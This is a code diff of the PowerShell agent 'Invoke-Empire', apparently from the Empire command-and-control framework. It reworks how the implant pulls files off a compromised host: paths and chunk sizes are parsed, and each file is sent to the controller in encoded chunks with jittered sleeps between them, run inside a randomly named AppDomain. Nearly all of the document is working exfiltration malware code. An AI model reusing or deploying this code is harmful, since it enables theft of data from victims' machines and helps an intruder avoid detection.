@@ -391,76 +391,35 @@ function Invoke-Empire {
 
     $DownloadFile = @"
 function Download-File {
-    param(`$Data,`$type,`$ResultID,`$Delay,`$Jitter)
-    try {
-        `$ChunkSize = 512KB
+    param(`$Path,`$ChunkSize,`$type,`$ResultID,`$Delay,`$Jitter)
+    # read in and send the specified chunk size back for as long as the file has more parts
+    `$Index = 0
+    do{
+        `$EncodedPart = Get-FilePart -File "`$Path" -Index `$Index -ChunkSize `$ChunkSize
 
-        `$Parts = `$Data.Split(" ")
+        if(`$EncodedPart) {
+            `$data = "{0}|{1}|{2}" -f `$Index, `$path, `$EncodedPart
+            Encode-Packet -type `$type -data `$(`$data) -ResultID `$ResultID)
+            `$Index += 1
 
-        if(`$Parts.Length -gt 1) {
-            `$Path = `$Parts[0..(`$parts.length-2)] -join " "
-            try {
-                `$ChunkSize = `$Parts[-1]/1
-                if(`$Parts[-1] -notlike "*b*") {
-                    # if MB/KB not specified, assume KB and adjust accordingly
-                    `$ChunkSize = `$ChunkSize * 1024
+            # if there are more parts of the file, sleep for the specified interval
+            if (`$script:AgentDelay -ne 0) {
+                `$min = [int]((1-`$Jitter)*`$Delay)
+                `$max = [int]((1+`$Jitter)*`$Delay)
+
+                if (`$min -eq `$max) {
+                    `$sleepTime = `$min
                 }
-            }
-            catch {
-                # if there's an error converting the last token, assume no
-                #   chunk size is specified and add the last token onto the path
-                `$Path += " `$(`$Parts[-1])"
-            }
-        }
-        else {
-            `$Path = `$Data
-        }
-
-        `$Path = `$Path.Trim('"').Trim("'")
-
-        # hardcoded floor/ceiling limits
-        if(`$ChunkSize -lt 64KB) {
-            `$ChunkSize = 64KB
-        }
-        elseif(`$ChunkSize -gt 8MB) {
-            `$ChunkSize = 8MB
-        }
-
-        # resolve the complete path
-        `$Path = Get-Childitem `$Path | ForEach-Object {`$_.FullName}
-
-        # read in and send the specified chunk size back for as long as the file has more parts
-        `$Index = 0
-        do{
-            `$EncodedPart = Get-FilePart -File "`$path" -Index `$Index -ChunkSize `$ChunkSize
-
-            if(`$EncodedPart) {
-                `$data = "{0}|{1}|{2}" -f `$Index, `$path, `$EncodedPart
-                Encode-Packet -type `$type -data `$(`$data) -ResultID `$ResultID)
-                `$Index += 1
-
-                # if there are more parts of the file, sleep for the specified interval
-                if (`$script:AgentDelay -ne 0) {
-                    `$min = [int]((1-`$Jitter)*`$Delay)
-                    `$max = [int]((1+`$Jitter)*`$Delay)
-
-                    if (`$min -eq `$max) {
-                        `$sleepTime = `$min
-                    }
-                    else{
-                        `$sleepTime = Get-Random -minimum `$min -maximum `$max;
-                    }
-                    Start-Sleep -s `$sleepTime;
+                else{
+                    `$sleepTime = Get-Random -minimum `$min -maximum `$max;
                 }
+                Start-Sleep -s `$sleepTime;
             }
-            [GC]::Collect()
-        } while(`$EncodedPart)
+        }
+        [GC]::Collect()
+    } while(`$EncodedPart)
 
-        Encode-Packet -type 40 -data "[*] File download of `$path completed" -ResultID `$ResultID
-    }
-    catch {
-        Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID `$ResultID
-    }    
+    Encode-Packet -type 40 -data "[*] File download of `$path completed" -ResultID `$ResultID 
 }
 
 function Encode-Packet {
@@ -572,7 +531,7 @@ function Get-FilePart {
 "@
 
     function Start-DownloadJob {
-        param($ScriptString,$Type,$ResultID,$Data)
+        param($ScriptString,$Type,$ResultID,$Path,$ChunkSize)
         $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
 
         # create our new AppDomain
@@ -582,7 +541,7 @@ function Get-FilePart {
         $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
 
         # add the target script into the new runspace/appdomain
-        $ScriptString = "$ScriptString`n Download-File -type $Type -Data $Data -ResultID $ResultID -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
+        $ScriptString = "$ScriptString`n Download-File -type $Type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
         $null = $PSHost.AddScript($ScriptString)
 
         # stupid v2 compatibility...
@@ -1028,8 +987,48 @@ function Get-FilePart {
             }
             # file download
             elseif($type -eq 41) {
-                $jobID = Start-DownloadJob -ScriptString $DownloadFile -Type $type -ResultID $ResultID -Data $Data
-                $script:ResultIDs[$jobID]=$ResultID
+                try {
+                    $ChunkSize = 512KB
+
+                    $Parts = $Data.Split(" ")
+
+                    if($Parts.Length -gt 1) {
+                        $Path = $Parts[0..($parts.length-2)] -join " "
+                        try {
+                            $ChunkSize = $Parts[-1]/1
+                            if($Parts[-1] -notlike "*b*") {
+                                # if MB/KB not specified, assume KB and adjust accordingly
+                                $ChunkSize = $ChunkSize * 1024
+                            }
+                        }
+                        catch {
+                            # if there's an error converting the last token, assume no
+                            #   chunk size is specified and add the last token onto the path
+                            $Path += " $($Parts[-1])"
+                        }
+                    }
+                    else {
+                        $Path = $Data
+                    }
+
+                    $Path = $Path.Trim('"').Trim("'")
+
+                    # hardcoded floor/ceiling limits
+                    if($ChunkSize -lt 64KB) {
+                        $ChunkSize = 64KB
+                    }
+                    elseif($ChunkSize -gt 8MB) {
+                        $ChunkSize = 8MB
+                    }
+
+                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
+
+                    $jobID = Start-DownloadJob -ScriptString $DownloadFile -Type $type -ResultID $ResultID -ChunkSize $ChunkSize -Path $Path
+                    $script:ResultIDs[$jobID]=$ResultID
+                }
+                catch {
+                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID `$ResultID
+                }
             }
             # file upload
             elseif($type -eq 42) {
